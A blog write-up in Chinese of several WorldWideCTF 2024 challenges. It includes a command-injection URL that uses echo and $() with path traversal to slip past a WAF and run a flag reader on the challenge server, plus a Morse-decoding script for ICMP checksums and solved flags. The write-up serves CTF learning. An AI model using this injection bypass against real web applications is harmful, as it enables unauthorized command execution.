---
title: '2024 World Wide CTF Writeup'
description: '发现有 WAF，但是只过滤了第一段命令，可以搭配 echo 和 $ 进行命令执行'
pubDate: 2024-06-20
author: 'IHK-1'
tags: ['CTF', 'WorldWideCTF', '2024']
---

# begin
## Secure Shell
```plain
https://secureshell.wwctf.com/?cmd=cat
```

发现有 WAF，但是只过滤了第一段命令，可以搭配 echo 和 $() 进行命令执行

```plain
https://secureshell.wwctf.com/?cmd=echo $(../../../../../../readflag)
```

<!-- 这是一张图片，ocr 内容为：WWF{TH3 OS COMM4ND 1NJ3CT10N!] 应用程序 无障碍环境 目存储 代网络 舟样式编辑器 性能 非内存 调试器 控制台 HACKBAR MAX HACKBAR VARIABLES XSS WAF PASSCODE OTHER LDAP BYPASSER BASED LFI HTTPS://SECURESHELL.WWCTF.COM/?CMD-ECHO $(.///.J.J.J.J.J.JREADFLAG) -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1733041378280-3ac1fcce-a8ab-4fbb-8591-05fa0bdfeb0b.png)

## Simpler RSA


# MISC
## World Wide Flags
```plain

http://flags.chal.wwctf.com:1337/flag
```

<!-- 这是一张图片，ocr 内容为：FLAG GUESSING CHALLENGE! YOU CAN GUESS ALL OF THE FLAGS? 100/100 (S91159115910L TY CSN TOL PTELFIFIEN SUBMIT SELECT... (ISO CODE E.G., US) CORRECT! -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1733036460589-d00682b8-d939-42c7-8956-3035609f80b2.png)

## Bongcloud
有点麻烦，暂未写

# Forensics
## Too Hidden
```plain
tshark -r chall.pcapng -T fields -e icmp.checksum > chall.txt
```

```python
lines = open('chall.txt').readlines()
out = ""
for line in lines:
    line = line.strip()
    if len(line):
        if line == "0xc3c9":
            out += "."
        elif line == "0xc3ca":
            out += "-"
        elif line == "0xc4cd":
            out += "/"

print(out)

# .--/.--/..-.//..../---/.-../-.--/..--.-/.../..../././././-/..--.-/-.--/---/..-/..--.-/-.-./.-/-./..--.-/..-./../-./-../..--.-/--/./..--.-/..--../..--../..--../..--../..--../..--../..--../..--../..--../..--../

# WWFHOLY_SHEEEET_YOU_CAN_FIND_ME_??????????
```

## Forgot Password
<!-- 这是一张图片，ocr 内容为：包含文本(C): WWFIC ? 纯文本 查找位号(L): 子文件夹(U) 纯文本 GHY 今天 今天 早于: 晚于 大小((LD) 修改日期 名称 报告 四四 摘要 文本 PREVIEW 烧卖 高高: 布尔表达式 吴:扛茗 友?)是(由默定LRA(昨英?美系PI革及?基高?欧兰ANK? NK 酒?距9?? 22 (T?LOIXD ? NK 部F?? VK PO-PE? 200000244 VK8727 WDAGUEILITYACCOUNTILLEYACCOUNTISEANC? PHIC OPERATORSLLENBEES ASE AUTHOTIZED TO PERFORE CLYPSEGEAPHIC OPEEATIONS.PY 7271H C?2D022 BUILT-IN GROUP USED BY INTEENET INFOREATION SEEVICES.9? - 220X36720092 K 1柿付92弹 NK X柳付92弹 7? ?漂X5 00?激编206X8贼-"钱? ,200000 HT? D 22.22692 WUKONG)22320133号持镜以6%,6\美软,手2网自6敬,进行,严格,严格, -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1733042944688-79887e4d-9349-4801-ba22-0ecaa78f768f.png)

```plain
wwf{I_love_security_questions_s0_muChhhhhhhhhhhhhhhhh}
```

